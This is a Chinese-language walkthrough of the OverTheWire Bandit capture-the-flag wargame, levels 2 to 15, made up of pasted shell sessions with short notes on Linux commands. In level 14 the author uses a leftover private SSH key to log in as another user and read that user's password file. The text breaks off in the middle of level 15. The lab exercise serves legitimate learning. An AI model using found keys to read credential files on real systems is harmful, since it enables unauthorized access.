4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  bandit1@bandit:~$ ls - bandit1@bandit:~$ cd - -bash: cd: OLDPWD not set bandit1@bandit:~$ cd \\- -bash: cd: OLDPWD not set bandit1@bandit:~$ cd /- -bash: cd: /-: No such file or directory bandit1@bandit:~$ ls -al total 24 -rw-r----- 1 bandit2 bandit1 33 Oct 16 2018 - drwxr-xr-x 2 root root 4096 Oct 16 2018 . drwxr-xr-x 41 root root 4096 Oct 16 2018 .. -rw-r--r-- 1 root root 220 May 15 2017 .bash_logout -rw-r--r-- 1 root root 3526 May 15 2017 .bashrc -rw-r--r-- 1 root root 675 May 15 2017 .profile bandit1@bandit:~$ cat /- cat: /-: No such file or directory bandit1@bandit:~$ cat ./- CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9   刚开始以为-是一个目录，便去cd，结果是oldpwd not set，百度之后发现是返回上一个目录\nls查看了才知道是是一个文件\n bash中，-会被解析为stdin，即标准输出流，假如直接$ cat -，这条命令会回显输入的任意字符，知道输入eof\n摆脱转义的方法就是使用相对路径或者绝对路径\n level 3 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  bandit2@bandit:~$ ls spaces in this filename bandit2@bandit:~$ ls -al total 24 drwxr-xr-x 2 root root 4096 Oct 16 2018 . drwxr-xr-x 41 root root 4096 Oct 16 2018 .. -rw-r--r-- 1 root root 220 May 15 2017 .bash_logout -rw-r--r-- 1 root root 3526 May 15 2017 .bashrc -rw-r--r-- 1 root root 675 May 15 2017 .profile -rw-r----- 1 bandit3 bandit2 33 Oct 16 2018 spaces in this filename bandit2@bandit:~$ cat spaces\\ in\\ this\\ filename UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK bandit2@bandit:~$ cat \"spaces in this filename\" UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK bandit2@bandit:~$ cat 'spaces in this filename' UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK   总所周知，linux文件名中假如有空格的话，直接输入肯定是打不开的\n我这边直接用tab，补全了所有对空格的转义\n当然，用引号包含也行\n https://unix.stackexchange.com/questions/148043/is-space-not-allowed-in-a-filename\n 一般来说linux和unix上应该避免文件名中包含空格的\nlevel 4 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  bandit3@bandit:~$ ls -al total 24 drwxr-xr-x 3 root root 4096 Oct 16 2018 . drwxr-xr-x 41 root root 4096 Oct 16 2018 .. -rw-r--r-- 1 root root 220 May 15 2017 .bash_logout -rw-r--r-- 1 root root 3526 May 15 2017 .bashrc drwxr-xr-x 2 root root 4096 Oct 16 2018 inhere -rw-r--r-- 1 root root 675 May 15 2017 .profile bandit3@bandit:~$ bandit3@bandit:~$ cd inhere bandit3@bandit:~/inhere$ ls -al total 12 drwxr-xr-x 2 root root 4096 Oct 16 2018 . drwxr-xr-x 3 root root 4096 Oct 16 2018 .. -rw-r----- 1 bandit4 bandit3 33 Oct 16 2018 .hidden bandit3@bandit:~/inhere$ cat .hidden pIwrPrtPN36QITSp3EQaw936yaFoFgAB   看来，直接ls -al 是个好习惯\n这题应该考察的是linux 的隐藏文件，linux的隐藏文件都以.开头\nlevel 5 bandit4@bandit:~$ ls -al total 24 drwxr-xr-x 3 root root 4096 Oct 16 2018 . drwxr-xr-x 41 root root 4096 Oct 16 2018 .. -rw-r--r-- 1 root root 220 May 15 2017 .bash_logout -rw-r--r-- 1 root root 3526 May 15 2017 .bashrc drwxr-xr-x 2 root root 4096 Oct 16 2018 inhere -rw-r--r-- 1 root root 675 May 15 2017 .profile bandit4@bandit:~$ cd inhere/ bandit4@bandit:~/inhere$ ls -al total 48 drwxr-xr-x 2 root root 4096 Oct 16 2018 . drwxr-xr-x 3 root root 4096 Oct 16 2018 .. -rw-r----- 1 bandit5 bandit4 33 Oct 16 2018 -file00 -rw-r----- 1 bandit5 bandit4 33 Oct 16 2018 -file01 -rw-r----- 1 bandit5 bandit4 33 Oct 16 2018 -file02 -rw-r----- 1 bandit5 bandit4 33 Oct 16 2018 -file03 -rw-r----- 1 bandit5 bandit4 33 Oct 16 2018 -file04 -rw-r----- 1 bandit5 bandit4 33 Oct 16 2018 -file05 -rw-r----- 1 bandit5 bandit4 33 Oct 16 2018 -file06 -rw-r----- 1 bandit5 bandit4 33 Oct 16 2018 -file07 -rw-r----- 1 bandit5 bandit4 33 Oct 16 2018 -file08 -rw-r----- 1 bandit5 bandit4 33 Oct 16 2018 -file09 bandit4@bandit:~/inhere$ cat ./-file00 ��������\u0013��~%\t\u0013C[�걱\u003e��\u0004| � bandit4@bandit:~/inhere$ cat ./-file01 ���U\"7�w\u0019���H��ê�Q����(�\u0004��#��� bandit4@bandit:~/inhere$ cat ./-file02 �\u001eT\u001f�v��(�ִ�����A*� 2\u0015J�Ş؇_�y7 bandit4@bandit:~/inhere$ cat ./-file03 ��.A��u��#��\u001c�w$N?c�-��Db3\u0014��=�\u0002� bandit4@bandit:~/inhere$ cat ./-file05 +\u0014\u0003��p\u0003\u0010m\u001e\u0001���;\u0011��:D��^��@�gl�Q� bandit4@bandit:~/inhere$ cat ./-file04 �=\u003c�W���\u0010��ht�Z��!\u0018\u0010��{\u0019�U � bandit4@bandit:~/inhere$ cat ./-file06 ��@�%@���\u0018ZP*E\u0002\u0002��1�V���̫*���\u0019� bandit4@bandit:~/inhere$ cat ./-file07 koReBOKuIDDepwhWk7jZC0RTdopnAYKh bandit4@bandit:~/inhere$ 太难了，题目说only human-readable，真的是遍历10个文件\n当然直接就找到flag了\nlevel 6 1 2 3 4 5 6 7 8 9 10  bandit5@bandit:~/inhere$ ls maybehere00 maybehere04 maybehere08 maybehere12 maybehere16 maybehere01 maybehere05 maybehere09 maybehere13 maybehere17 maybehere02 maybehere06 maybehere10 maybehere14 maybehere18 maybehere03 maybehere07 maybehere11 maybehere15 maybehere19 bandit5@bandit:~/inhere$ du -a -b | grep 1033 1033\t./maybehere07/.file2 bandit5@bandit:~/inhere$ cat ./maybehere07/.file2 DXjZPULLxYr17uwoI01bNLQbtFemEgo7 bandit5@bandit:~/inhere$   给出三个条件：可读的，大小为1033bytes，不可执行的\n明显的，只有大小最好搜索，使用命令du -a -b显示出所有文件，以bytes为单位的大小，然后使用管道过滤搜索就行了\nlevel 7  https://www.runoob.com/linux/linux-comm-find.html\nhttps://www.cnblogs.com/RXDXB/p/11696751.html\n 找海量文件终于要用到了find命令\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67  bandit6@bandit:/home$ find / -user 'bandit7' -group 'bandit6' -size 33c find: ‘/run/lvm’: Permission denied find: ‘/run/screen/S-bandit27’: Permission denied find: ‘/run/screen/S-bandit25’: Permission denied find: ‘/run/screen/S-bandit2’: Permission denied find: ‘/run/screen/S-bandit16’: Permission denied find: ‘/run/screen/S-bandit0’: Permission denied find: ‘/run/screen/S-bandit20’: Permission denied find: ‘/run/screen/S-bandit30’: Permission denied find: ‘/run/screen/S-bandit14’: Permission denied find: ‘/run/screen/S-bandit33’: Permission denied find: ‘/run/screen/S-bandit13’: Permission denied find: ‘/run/screen/S-bandit31’: Permission denied find: ‘/run/screen/S-bandit8’: Permission denied find: ‘/run/screen/S-bandit5’: Permission denied find: ‘/run/screen/S-bandit4’: Permission denied find: ‘/run/screen/S-bandit29’: Permission denied find: ‘/run/screen/S-bandit28’: Permission denied find: ‘/run/screen/S-bandit21’: Permission denied find: ‘/run/screen/S-bandit26’: Permission denied find: ‘/run/screen/S-bandit24’: Permission denied find: ‘/run/screen/S-bandit22’: Permission denied find: ‘/run/screen/S-bandit1’: Permission denied find: ‘/run/screen/S-bandit19’: Permission denied find: ‘/run/screen/S-bandit23’: Permission denied find: ‘/run/shm’: Permission denied find: ‘/run/lock/temp/bandit31-git’: Permission denied find: ‘/run/lock/temp/bandit30-git’: Permission denied find: ‘/run/lock/temp/bandit29-git’: Permission denied find: ‘/run/lock/temp/bandit28-git’: Permission denied find: ‘/run/lock/temp/bandit27-git’: Permission denied find: ‘/run/lock/temp/bandit5/inhere’: Permission denied find: ‘/run/lock/lvm’: Permission denied find: ‘/var/spool/bandit24’: Permission denied find: ‘/var/spool/rsyslog’: Permission denied find: ‘/var/spool/cron/crontabs’: Permission denied find: ‘/var/log’: Permission denied find: ‘/var/tmp’: Permission denied find: ‘/var/cache/ldconfig’: Permission denied find: ‘/var/cache/apt/archives/partial’: Permission denied /var/lib/dpkg/info/bandit7.password find: ‘/var/lib/apt/lists/partial’: Permission denied find: ‘/var/lib/polkit-1’: Permission denied find: ‘/cgroup2/csessions’: Permission denied find: ‘/home/bandit28-git’: Permission denied find: ‘/home/bandit30-git’: Permission denied find: ‘/home/bandit31-git’: Permission denied find: ‘/home/bandit5/inhere’: Permission denied find: ‘/home/bandit27-git’: Permission denied find: ‘/home/bandit29-git’: Permission denied find: ‘/tmp’: Permission denied find: ‘/lost+found’: Permission denied find: ‘/root’: Permission denied find: ‘/etc/ssl/private’: Permission denied find: ‘/etc/lvm/backup’: Permission denied find: ‘/etc/lvm/archive’: Permission denied find: ‘/etc/polkit-1/localauthority’: Permission denied find: ‘/sys/fs/pstore’: Permission denied find: ‘/proc/tty/driver’: Permission denied find: ‘/proc/29536/task/29536/fd/6’: No such file or directory find: ‘/proc/29536/task/29536/fdinfo/6’: No such file or directory find: ‘/proc/29536/fd/5’: No such file or directory find: ‘/proc/29536/fdinfo/5’: No such file or directory find: ‘/boot/lost+found’: Permission denied bandit6@bandit:/home$ cat /var/lib/dpkg/info/bandit7.password HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs   毕竟是别人的服务器嘛，找出其中可以访问的就是目标文件了\nlevel 8  strings：用于打印文件中可打印的字符\n 1 2 3 4 5 6 7  bandit7@bandit:~$ ls data.txt bandit7@bandit:~$ less data.txt bandit7@bandit:~$ strings data.txt |grep millionth millionth\tcvX2JJa4CFALtqS87jk27qwqGhBM9plV bandit7@bandit:~$   一看这题目就感觉很大，用less看下格式，然后直接用grep去查找就行了\ncat命令在这也是可以和strings互换的\nlevel 9  uniq 命令用于检查及删除文本文件中重复出现的行列，一般与 sort 命令结合使用 uniq 可检查文本文件中重复出现的行列\nhttps://www.runoob.com/linux/linux-comm-uniq.html\nsort命令用于将文本文件内容加以排序 sort可针对文本文件的内容，以行为单位来排序\nhttps://www.runoob.com/linux/linux-comm-sort.html\n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105  bandit8@bandit:~$ cat data.txt | sort | uniq -c 10 07iR6PwHwihvQ3av1fqoRjICCulpoyms 10 0ob6rCn4D4jQ6KCiaT5hmOdWFrm2quR1 10 1drBmDT7PYS7hVgoTWkJSjUZUK7ZAIAa 10 1JnkIYLDOdn5M7TGabYxOWkn7HazMjYW 10 1wBrW0VGjKeYiXltbEWrUipwSHQfTu44 10 2Dxbtw8cnKyHwvt0lfFNYOGc4cE59uua 10 2TRkCQhbMjcM0hwL31NnJQ0DVagWN3Ca 10 4c7EsUtqLnLR9hiepV5EQVhdMgyi8onL 10 4cQDXE4IPH8fCBUBZaTPgnY2gwnPnlj6 10 6495bfC0lI1Qkw5kzZHnbVWooaOZHLvj 10 6rEzM4Qro8dH0e3uemAyYseTiNiNAYap 10 78rgduVcLZjLzZmooObdaN541MKV6IfQ 10 8qkrbCAUG9I28M49j9flUro5fWxenFzF 10 aIl4xN5maZVCQITz0xH0KNXIlLc0MhNf 10 aPsCQmSWVYGQQHUD6k1fHC2kqSyMlxwV 10 awglWaTRSAWBcol8hSMTJP4FYhIGJHVO 10 bCJdTkork5IRbZaaPZK0WVPgYIIO4mHF 10 BPl0XNou7xAZAI5fdzWzSmPkW1PnvTE1 10 bvIaDTzHBOGSO7CfpH9vUrJRRlwYTUA7 10 CS8HVrDmKGLG53qziqQCLWNRlUP1FHsV 10 CwwHDVp0pO6zmFp87L9AtFzqU5aB5j9w 10 CyziIvGRdotoy9yA00RAnvvkvrYdKCPp 10 DRqDxJYAv7IUfAMmrXtXEiz63TUjqeDn 10 DXI6y5CNPU06rVpkoZgnZJBWfkdW131j 10 enNw6tuj8mSxxS7f2Yd05puXVeuCZ39G 10 ewllxPExW9eaHxAH8WZkW9lDuK5cZcUy 10 eyKcuNPKnjt25kaOZxkMYQ9xqp45aIk9 10 fIBXc239DbhORY4t9xjgi7fSm4thHsIb 10 fiK30QpqzoULACXZwkBEKJZvpPQx9Uqm 10 FlHOKVUDNLx6Ga7CxC4ISRYNflN1GAnF 10 G4BHP66B4l3XkvB05CMgzrEKyjHhuCwz 10 gCx35PlKn08nrFFrAgHYLrUVWWZjLdqM 10 GEzwi36aKB8PLlCPH2wzl9gHzVm97IYu 10 glONDdR72FJL3Gc03nVNO4PKNzXFGH1A 10 gqGBgY1IdFDGG2XzB2o1VNGY4j6OL76V 10 h7jtcUsBhrryyLhtt1mT6Jdmp0l6ozBs 10 HKryX0XX2HT4WBT0OUzRz5Ac5B2rvIHU 10 iM3PaCO3VAxAdbdVsdGtEwuwrFQPYJV7 10 irGm6F73sbUrFhHukhp6JXgMQyLxJTz1 10 jtNdk5KDgrMkxgbZSJOvjOcM58svrzDY 10 jVscZ5eK5DWN7IvDSehXmyplCXRSbHJS 10 KerqNiDbY0zV2VxnOCmWX5XWxumldlAe 10 kha3sCpHsydUNrxLLXV3cFqWyucGjdxr 10 kt1VUEZpimCS4BaoAvhN3rgHOmhqaMIR 10 KUzqHCrxHSpgfkF5ZAzUfjlBaXW3zIaZ 10 L0nxAwlfV9V3J5onKIT8KYQ9InTcQ7yE 10 lnB8MWOYjETxoC8bQYrMFnxxQXAWHjP4 10 lZ9DhnzeHgIuLqYPmNzONpMCkuBYoeJI 10 M8JMUd7MSd4mOwZj1843ejBH5RXJOloa 10 mdug9JbW836YVZh3ALULBAxODlinqonJ 10 MIpMch66sYTmmqepKYczlRA9aJrnkt68 10 MpAqsgjJIVLT1MxSZcRoOOzl6g1db98Q 10 MQrydyojsVIYJSY8y1nCMjZGxnL1My7F 10 MsxcvOe3PGrt78wpZG2bBNF5wfXpZhET 10 n5fEmvCXKbJErzIDt3MLTmZZVMRNynrR 10 NL91hwGrqW5lVgoicb592Sd0djnHnbjZ 10 Nnih4Q0jf3xEOTcmM3yw2HkOm3VPox0w 10 NT4p09XwRb0k0wG9yIuvfs3MblMGpMc1 10 nU5zbsdUfmzv7cjNwkV9Hgb65OVe5EDt 10 nyvBweoC3kzt5QRTjbDfrWO7jhwOGN4g 10 OcVxHzDW027KWNFS03G31KQEb5TgN1WV 10 peXkYozDKE2u2BEOed5vvkY0nyjkGawn 10 PXHEt0PztCiArDZ7UCBmqKdBCiXNQWBN 10 QmFayGbrzFoiQ5Z2PGmnD2N6Pf77cxl9 10 QNTac9UtCmQ5VGAnzj10Z9BwV4TuaVvu 10 qsbKthWb80f3vQKBP7O12SjfFo1V5VkL 10 quhCb8ZIUJXXM2SbY1ER1D5GaDlQjdDa 10 QYeOFhgJCJEfKM1ZpT0K322R6SuKdCFT 10 r0VIMA1yzv838m7UfvutUhCf0zaY3Rqw 10 rfUNSGOvmQXz0m7PtFoEoPg1BpTbll7X 10 rJMbGeeDTMsj1RA4YibIQr0o9azHgP0I 10 rQAYnkKAXIViP4ROmehnDMIAXLpOOLEp 10 sBB2H7HateUFxr2oxrqUVoumFM60f1lj 10 SjFHXKRcIc7jlAYGknVMnGXSFd6xRmnF 10 tDZbF2SuhsvfaA3eTnwfcjQa1pZoPJeX 10 tiyVGzZcRwUPVAiqkroFMUbMI9ut9hcT 10 tLKyRATtoCuxMR4zZg1Dnlnr3je3bSHe 10 tmzBM5rcV9y7AM1xDHudL2yX9oefGieT 10 tWwjd16fG17vGdjutfOygVTjEGxlijOS 10 uBRx9inQTeaDZAuzEb2MadWXmkH8uW4O 1 UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR 10 vBo3qbjNEF2d3meGEkRfc3mKpjtiDz1i 10 VElUBEIhJ4yBgOBSN05WgtV2rF6kkGdz 10 vl9liaz8TKv1enUi0S2REhn01hKjjFIK 10 vVwG2mb8rU8eCuIlBhCJrZJ4GWR35nWY 10 W0vbGkT5mfRVWHAXCcMekevbenMJHFhN 10 W6pn7siBPh5G6ndjv1xx26iHxke8PviX 10 WaKxNQhiI9dXwvzB1PMpbQRy4CutGrWt 10 WbfstqfIvgiEuCVVuxwLgLyzUMtho2jP 10 WBjoFnis277W9vWB8M67h3z1glOYG2Fy 10 wSpAMdiBSeywE4d1DQZoSp5o8ZVOCqGP 10 wWfTfhYKmBkmyGH9D6Qjb6x7bMt5narC 10 x0bga8Oxz5lgM8k52HrYy4ez7XJI0lM0 10 XURYdoIx95clq6s90MORDydQ187DxQhS 10 xWmqkcrZ7TmjE7LKjqHVXSLw9fqsjYXp 10 XWy99VXVCnwdr780PK86hP6rBMkV5E3n 10 y9sn56N0ZhyxaySYRs518D4vqkMShHwb 10 YiQvaaidmD39i0ryGZz97Upc5NjgPklY 10 YR0sflfJZ34iuY3wM3DNNO19dBYnJDmt 10 yXGLvp7UaeiDKxLGXQYlWuRWdIgeCaT0 10 YzZX7E35vOa6IQ9SRUGdlEpyaiyjvWXE bandit8@bandit:~$ cat data.txt | sort | uniq -u UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR   这里的知识是linux的文本处理\n用uniq -c 统计每个字符串出现的次数，-u即可显示只出现一次的字符串\nlevel 10 找出以=开头的字符出，可读的\n第一反应想到的是正则表达式和strings命令，尝试了一下，直接成功\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  bandit9@bandit:~$ strings data.txt |grep \"=.*\" 2========== the ========== password \u003et=\tyP rV~dHm= ========== isa =FQ?P\\U =\tF[ pb=x J;m= =)$= ========== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk iv8!= bandit9@bandit:~$ bandit9@bandit:~$ strings data.txt |grep \"=\" 2========== the ========== password \u003et=\tyP rV~dHm= ========== isa =FQ?P\\U =\tF[ pb=x J;m= =)$= ========== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk iv8!=   后面看别人直接grep也能成功，可真是出人意料\n这边的知识点应该是grep是支持正则表达式的字符串的\nlevel 11 1 2 3 4 5 6 7 8  bandit10@bandit:~$ strings data.txt | less bandit10@bandit:~$ strings data.txt VGhlIHBhc3N3b3JkIGlzIElGdWt3S0dzRlc4TU9xM0lSRnFyeEUxaHhUTkViVVBSCg== bandit10@bandit:~$ cat data.txt VGhlIHBhc3N3b3JkIGlzIElGdWt3S0dzRlc4TU9xM0lSRnFyeEUxaHhUTkViVVBSCg== bandit10@bandit:~$ strings data.txt | base64 -d The password is IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR bandit10@bandit:~$   直接less读取怕文件太大，结果就只有一行明显的base64加密\n百度了linux中base64命令的用法，毕竟题意就是让用linux命令进行操作的\nbase64用法如下\n1 2 3  $ echo \"Hello World\" | base64 SGVsbG8gV29ybGQK $ echo \"SGVsbG8gV29ybGQK\" | base64 -d   加-d选项为解密\nlevel 12 看题目是rot13加密，如何用linux指令实现呢\n这里用到了tr命令\n tr 命令用于转换或删除文件中的字符\ntr 指令从标准输入设备读取数据，经过字符串转译后，将结果输出到标准输出设备\nhttps://www.runoob.com/linux/linux-comm-tr.html\nhttps://www.xp.cn/php/2675.html\n 1 2 3 4 5  bandit11@bandit:~$ cat data.txt Gur cnffjbeq vf 5Gr8L4qetPEsPk8htqjhRK8XSP6x2RHh bandit11@bandit:~$ cat data.txt | tr 'N-Z A-M n-z a-m' 'A-M N-Z a-m n-z' The password is 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu bandit11@bandit:~$   level 13 据说这是xxd导出的十六进制文件\n我们去搜xxd命令，恢复成二级制用xxd -r filename\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116  bandit12@bandit:~$ mkdir /tmp/magicking bandit12@bandit:~$ cp data.txt /tmp/magicking/data.txt bandit12@bandit:~$ cd /tmp/magicking bandit12@bandit:/tmp/magicking$ ls data.txt bandit12@bandit:/tmp/magicking$ cat data.txt 00000000: 1f8b 0808 d7d2 c55b 0203 6461 7461 322e .......[..data2. 00000010: 6269 6e00 013c 02c3 fd42 5a68 3931 4159 bin..\u003c...BZh91AY 00000020: 2653 591d aae5 9800 001b ffff de7f 7fff \u0026SY............. 00000030: bfb7 dfcf 9fff febf f5ad efbf bbdf 7fdb ................ 00000040: f2fd ffdf effa 7fff fbd7 bdff b001 398c ..............9. 00000050: 1006 8000 0000 0d06 9900 0000 6834 000d ............h4.. 00000060: 01a1 a000 007a 8000 0d00 0006 9a00 d034 .....z.........4 00000070: 0d1a 3234 68d1 e536 a6d4 4000 341a 6200 ..24h..6..@.4.b. 00000080: 0069 a000 0000 0000 d003 d200 681a 0d00 .i..........h... 00000090: 0001 b51a 1a0c 201e a000 6d46 8068 069a ...... ...mF.h.. 000000a0: 6834 340c a7a8 3406 4000 0680 0001 ea06 h44...4.@....... 000000b0: 8190 03f5 4032 1a00 0343 4068 0000 0686 ....@2...C@h.... 000000c0: 8000 0320 00d0 0d00 0610 0014 1844 0308 ... .........D.. 000000d0: 04e1 c542 9ab8 2c30 f1be 0b93 763b fb13 ...B..,0....v;.. 000000e0: 50c4 c101 e008 3b7a 92a7 9eba 8a73 8d21 P.....;z.....s.! 000000f0: 9219 9c17 052b fb66 a2c2 fccc 9719 b330 .....+.f.......0 00000100: 6068 8c65 e504 5ec0 ae02 fa6d 16bc 904b `h.e..^....m...K 00000110: ba6c f692 356e c02b 0374 c394 6859 f5bb .l..5n.+.t..hY.. 00000120: 0f9f 528e 4272 22bb 103c 2848 d8aa 2409 ..R.Br\"..\u003c(H..$. 00000130: 24d0 d4c8 4b42 7388 ce25 6c1a 7ec1 5f17 $...KBs..%l.~._. 00000140: cc18 ddbf edc1 e3a4 67f1 7a4d 8277 c823 ........g.zM.w.# 00000150: 0450 2232 40e0 07f1 ca16 c6d6 ef0d ecc9 .P\"2@........... 00000160: 8bc0 5e2d 4b12 8586 088e 8ca0 e67d a55c ..^-K........}.\\ 00000170: 2ca0 18c7 bfb7 7d45 9346 ea5f 2172 01e4 ,.....}E.F._!r.. 00000180: 5598 673f 45af 69b7 a739 7814 8706 04ed U.g?E.i..9x..... 00000190: 5442 1240 0796 6cc8 b2f6 1ef9 8d13 421d TB.@..l.......B. 000001a0: 461f 2e68 4d91 5343 34b5 56e7 46d0 0a0a F..hM.SC4.V.F... 000001b0: 72b7 d873 71d9 6f09 c326 402d dbc0 7cef r..sq.o..\u0026@-..|. 000001c0: 53b1 df60 9ec7 f318 00df 3907 2e85 d85b S..`......9....[ 000001d0: 6a1a e105 0207 c580 e31d 82d5 8646 183c j............F.\u003c 000001e0: 6a04 4911 101a 5427 087c 1f94 47a2 270d j.I...T'.|..G.'. 000001f0: ad12 fc5c 9ad2 5714 514f 34ba 701d fb69 ...\\..W.QO4.p..i 00000200: 8eed 0183 e2a1 53ea 2300 26bb bd2f 13df ......S.#.\u0026../.. 00000210: b703 08a3 2309 e43c 44bf 75d4 905e 5f96 ....#..\u003cD.u..^_. 00000220: 481b 362e e82d 9093 7741 740c e65b c7f1 H.6..-..wAt..[.. 00000230: 5550 f247 9043 5097 d626 3a16 da32 c213 UP.G.CP..\u0026:..2.. 00000240: 2acd 298a 5c8a f0c1 b99f e2ee 48a7 0a12 *.).\\.......H... 00000250: 03b5 5cb3 0037 cece 773c 0200 00 ..\\..7..w\u003c... bandit12@bandit:/tmp/magicking$ xxd -r data.txt bandit12@bandit:/tmp/magicking$ xxd -r data.txt \u003e data bandit12@bandit:/tmp/magicking$ file data data: gzip compressed data, was \"data2.bin\", last modified: Tue Oct 16 12:00:23 2018, max compression, from Unix bandit12@bandit:/tmp/magicking$ mv data data.gz bandit12@bandit:/tmp/magicking$ gz -d data.gz -bash: gz: command not found bandit12@bandit:/tmp/magicking$ gnuzip -d data.gz -bash: gnuzip: command not found bandit12@bandit:/tmp/magicking$ gzip -d data.gz bandit12@bandit:/tmp/magicking$ ls data data.txt bandit12@bandit:/tmp/magicking$ file data data: bzip2 compressed data, block size = 900k bandit12@bandit:/tmp/magicking$ mv data data.bz2 bandit12@bandit:/tmp/magicking$ bz2 -d data.bz2 -bash: bz2: command not found bandit12@bandit:/tmp/magicking$ bzip2 -d data.bz2 bandit12@bandit:/tmp/magicking$ ls data data.txt bandit12@bandit:/tmp/magicking$ file data data: gzip compressed data, was \"data4.bin\", last modified: Tue Oct 16 12:00:23 2018, max compression, from Unix bandit12@bandit:/tmp/magicking$ gzip -d data gzip: data: unknown suffix -- ignored bandit12@bandit:/tmp/magicking$ mv data data.gz bandit12@bandit:/tmp/magicking$ gzip -d data.gz bandit12@bandit:/tmp/magicking$ file data data: POSIX tar archive (GNU) bandit12@bandit:/tmp/magicking$ mv data data.tar bandit12@bandit:/tmp/magicking$ tar -x data.tar tar: Refusing to read archive contents from terminal (missing -f option?) tar: Error is not recoverable: exiting now bandit12@bandit:/tmp/magicking$ tar -xvf data.tar data5.bin bandit12@bandit:/tmp/magicking$ ls data5.bin data.tar data.txt bandit12@bandit:/tmp/magicking$ file data5.bin data5.bin: POSIX tar archive (GNU) bandit12@bandit:/tmp/magicking$ mv data5.bin data5.bin.tar bandit12@bandit:/tmp/magicking$ tar -xvf data5.bin.tar data6.bin bandit12@bandit:/tmp/magicking$ file data6.bin data6.bin: bzip2 compressed data, block size = 900k bandit12@bandit:/tmp/magicking$ mv data6.bin data6.bin.bz2 bandit12@bandit:/tmp/magicking$ bzip2 -d data6.bin.bz2 bandit12@bandit:/tmp/magicking$ ls data5.bin.tar data6.bin data.tar data.txt bandit12@bandit:/tmp/magicking$ ls -l total 48 -rw-r--r-- 1 bandit12 root 10240 Oct 16 2018 data5.bin.tar -rw-r--r-- 1 bandit12 root 10240 Oct 16 2018 data6.bin -rw-r--r-- 1 bandit12 root 20480 Feb 14 10:42 data.tar -rw-r----- 1 bandit12 root 2581 Feb 14 10:37 data.txt bandit12@bandit:/tmp/magicking$ file data6.bin data6.bin: POSIX tar archive (GNU) bandit12@bandit:/tmp/magicking$ mv data6.bin data6.bin.tar bandit12@bandit:/tmp/magicking$ tar -xvf data6.bin.tar data8.bin bandit12@bandit:/tmp/magicking$ file data8.bin data8.bin: gzip compressed data, was \"data9.bin\", last modified: Tue Oct 16 12:00:23 2018, max compression, from Unix bandit12@bandit:/tmp/magicking$ mv data8.bin data8.bin.gz bandit12@bandit:/tmp/magicking$ gzip -d data8.bin.gz bandit12@bandit:/tmp/magicking$ ls data5.bin.tar data6.bin.tar data8.bin data.tar data.txt bandit12@bandit:/tmp/magicking$ file data8.bin data8.bin: ASCII text bandit12@bandit:/tmp/magicking$ cat data8.bin The password is 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL bandit12@bandit:/tmp/magicking$   逐渐熟练的解压缩操作，简直了这压缩层数，丧心病狂\nlevel 14 根据题目所描述，/etc/bandit_pass/bandit14 and can only be read by user bandit14\n我们肯定无法访问\n但是，ls之后，发现有一个私钥，而且题目表示可以不用密码\n那么这文件就是ssh bandit14的私钥\n直接连接，ojbk\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  bandit13@bandit:~$ ls sshkey.private bandit13@bandit:~$ cat /etc/bandit_pass/bandit14 cat: /etc/bandit_pass/bandit14: Permission denied bandit13@bandit:~$ ssh usage: ssh [-1246AaCfGgKkMNnqsTtVvXxYy] [-b bind_address] [-c cipher_spec] [-D [bind_address:]port] [-E log_file] [-e escape_char] [-F configfile] [-I pkcs11] [-i identity_file] [-J [user@]host[:port]] [-L address] [-l login_name] [-m mac_spec] [-O ctl_cmd] [-o option] [-p port] [-Q query_option] [-R address] [-S ctl_path] [-W host:port] [-w local_tun[:remote_tun]] [user@]hostname [command] bandit13@bandit:~$ ssh -i sshkey.private bandit14@localhost Could not create directory '/home/bandit13/.ssh'. The authenticity of host 'localhost (127.0.0.1)' can't be established. ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc. Are you sure you want to continue connecting (yes/no)? yes Failed to add the host to the list of known hosts (/home/bandit13/.ssh/known_hosts). This is a OverTheWire game server. More information on http://www.overthewire.org/wargames ...... bandit14@bandit:~$ cat /etc/bandit_pass/bandit14 4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e   level 15 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  bandit14@bandit:~$ cat /etc/bandit_pass/bandit14 4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e bandit14@bandit:~$ bandit14@bandit:~$ telnet localhost 30000 Trying 127.0.0.1... Connected to localhost. Escape character is '^]'. Wrong! Please enter the correct current password Connection closed by foreign host. bandit14@bandit:~$ telnet 